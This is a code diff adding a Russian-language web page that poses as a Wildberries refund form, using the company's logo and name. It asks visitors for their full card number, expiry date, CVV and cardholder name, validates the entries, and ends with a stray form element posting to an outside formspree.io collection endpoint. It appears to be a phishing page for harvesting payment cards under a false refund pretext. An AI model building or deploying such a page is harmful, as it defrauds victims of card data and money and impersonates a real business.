@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Финансовый возврат</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      width: 100%;
+      background: #9b4dca;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      text-align: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+
+    header .logo-link {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: white;
+      text-decoration: none;
+      font-size: 26px;
+      font-weight: bold;
+      padding: 18px;
+    }
+
+    header .logo-link img {
+      height: 32px;
+      width: 32px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    h2 {
+      text-align: center;
+      color: #a000c8;
+      margin-bottom: 5px;
+      font-size: 28px;
+      opacity: 0;
+      animation: slideDown 1s forwards;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 17px;
+      color: #555;
+      margin: 0 0 20px 0;
+      line-height: 1.5;
+      opacity: 0;
+      animation: fadeIn 1.5s ease-in-out forwards;
+      animation-delay: 0.5s;
+    }
+
+    .field {
+      margin-bottom: 14px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+      transition: all 0.3s ease;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeUp 0.6s ease forwards;
+    }
+
+    input:nth-of-type(1) { animation-delay: 0.2s; }
+    .row input:nth-of-type(1) { animation-delay: 0.4s; }
+    .row input:nth-of-type(2) { animation-delay: 0.6s; }
+    #cardName { animation-delay: 0.7s; }
+    button { animation-delay: 0.9s; }
+
+    input:focus {
+      border-color: #a000c8;
+      box-shadow: 0 0 6px rgba(160, 0, 200, 0.4);
+      transform: scale(1.02);
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .row .field {
+      flex: 1;
+      margin-bottom: 14px;
+    }
+
+    button {
+      background: linear-gradient(45deg, #a000c8, #ff4ddb);
+      background-size: 200% 200%;
+      color: white;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      transition: transform 0.15s ease, background-position 0.5s;
+    }
+
+    button:hover {
+      background-position: right center;
+      transform: scale(1.05);
+    }
+
+    button:active {
+      transform: scale(0.95);
+    }
+
+    /* Ошибки */
+    .error {
+      color: red;
+      font-size: 14px;
+      min-height: 16px;
+      margin-top: 4px;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .error.show {
+      opacity: 1;
+    }
+
+    input.error {
+      border-color: red;
+      box-shadow: 0 0 6px rgba(255, 0, 0, 0.6);
+    }
+
+    input.success {
+      border-color: green;
+      box-shadow: 0 0 6px rgba(0, 200, 0, 0.6);
+    }
+
+    /* Анимации */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes fadeUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <a href="https://www.wildberries.ru/" target="_blank" class="logo-link">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Wildberries_logo.svg/512px-Wildberries_logo.svg.png" alt="logo">
+      <span>WILDBERRIES</span>
+    </a>
+  </header>
+
+  <div class="container">
+    <h2>Финансовый возврат</h2>
+    <p class="subtitle">Для получения возврата денежных средств введите данные карты</p>
+    <form id="refundForm">
+      <div class="field">
+        <input type="tel" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+        <div class="error" id="cardError"></div>
+      </div>
+      
+      <div class="row">
+        <div class="field">
+          <input type="tel" id="expiry" placeholder="00 / 00" maxlength="7" inputmode="numeric" required>
+          <div class="error" id="expiryError"></div>
+        </div>
+        <div class="field">
+          <input type="tel" id="cvv" placeholder="000" maxlength="3" inputmode="numeric" required>
+          <div class="error" id="cvvError"></div>
+        </div>
+      </div>
+      
+      <div class="field">
+        <input type="text" id="cardName" placeholder="Имя владельца" required>
+        <div class="error" id="nameError"></div>
+      </div>
+      
+      <button type="submit">Отправить запрос</button>
+    </form>
+  </div>
+
+  <script>
+    const cardInput = document.getElementById('orderNumber');
+    const expiryInput = document.getElementById('expiry');
+    const cvvInput = document.getElementById('cvv');
+    const nameInput = document.getElementById('cardName');
+    const form = document.getElementById('refundForm');
+
+    function showError(id, message) {
+      const el = document.getElementById(id);
+      el.textContent = message;
+      el.classList.add('show');
+    }
+
+    function clearErrors() {
+      document.querySelectorAll('.error').forEach(el => {
+        el.textContent = '';
+        el.classList.remove('show');
+      });
+      document.querySelectorAll('input').forEach(el => el.classList.remove('error','success'));
+    }
+
+    // Маска для номера карты
+    cardInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      value = value.slice(0,16);
+      const parts = value.match(/.{1,4}/g);
+      e.target.value = parts ? parts.join(' ') : '';
+      if (value.length === 16) expiryInput.focus();
+    });
+
+    // Маска для MM / YY
+    expiryInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 4) value = value.slice(0,4);
+      if (value.length > 2) {
+        e.target.value = value.slice(0,2) + " / " + value.slice(2);
+      } else {
+        e.target.value = value;
+      }
+      if (value.length === 4) cvvInput.focus();
+    });
+
+    // Маска для CVV
+    cvvInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+    });
+
+    // Валидация формы
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      clearErrors();
+
+      const cardNumber = cardInput.value.replace(/\s/g, '');
+      const expiry = expiryInput.value.replace(/\s/g, '');
+      const cvv = cvvInput.value;
+      const cardName = nameInput.value.trim();
+
+      let hasError = false;
+
+      // Проверка карты
+      if (!/^\d{16}$/.test(cardNumber)) {
+        showError('cardError', 'Введите корректный номер карты (16 цифр).');
+        cardInput.classList.add('error');
+        hasError = true;
+      } else {
+        cardInput.classList.add('success');
+      }
+
+      // Проверка срока действия
+      if (!/^\d{2}\/\d{2}$/.test(expiry.replace(' ', ''))) {
+        showError('expiryError', 'Введите срок действия в формате MM/YY.');
+        expiryInput.classList.add('error');
+        hasError = true;
+      } else {
+        const [month, year] = expiry.split('/').map(v => parseInt(v, 10));
+        const now = new Date();
+        const currentMonth = now.getMonth() + 1;
+        const currentYear = now.getFullYear() % 100;
+
+        if (month < 1 || month > 12) {
+          showError('expiryError', 'Месяц должен быть от 01 до 12.');
+          expiryInput.classList.add('error');
+          hasError = true;
+        } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
+          showError('expiryError', 'Срок действия карты истёк.');
+          expiryInput.classList.add('error');
+          hasError = true;
+        } else {
+          expiryInput.classList.add('success');
+        }
+      }
+
+      // Проверка CVV
+      if (!/^\d{3}$/.test(cvv)) {
+        showError('cvvError', 'Введите корректный CVV (3 цифры).');
+        cvvInput.classList.add('error');
+        hasError = true;
+      } else {
+        cvvInput.classList.add('success');
+      }
+
+      // Проверка имени
+      if (cardName.length < 2) {
+        showError('nameError', 'Введите имя владельца.');
+        nameInput.classList.add('error');
+        hasError = true;
+      } else {
+        nameInput.classList.add('success');
+      }
+
+      if (!hasError) {
+        alert('✅ Все данные введены корректно');
+      }
+    });
+  </script>
+</body>
+</html>
+<form
+  action="https://formspree.io/f/mkgvkrkp"
+  method="POST"
